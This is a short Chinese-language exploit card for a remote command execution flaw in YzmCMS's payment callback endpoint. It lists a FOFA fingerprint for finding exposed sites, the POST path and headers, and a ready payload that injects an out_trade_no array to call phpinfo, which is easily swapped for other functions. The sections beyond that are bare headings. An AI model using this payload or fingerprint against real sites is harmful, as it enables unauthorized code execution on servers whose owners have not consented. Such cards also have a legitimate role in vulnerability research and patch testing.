# YzmCMS-pay_callback远程命令执行

- **系统**：YzmCMS　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`app="yzmcms"`
- **请求**：`POST /pay/index/pay_callback.html HTTP/1.1`
- **关键头**：`Host: 127.0.0.1`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
out_trade_no[0]=eq&out_trade_no[1]=1&out_trade_no[2]=phpinfo
>
```

**其他**
- YzmCMS-pay_callback远程命令执行: + 一、漏洞简介
    - 二、漏洞概述
    - 三、网络测绘
    - 四、 漏洞复现
---
- 网络测绘: ```bash
app="yzmcms"
```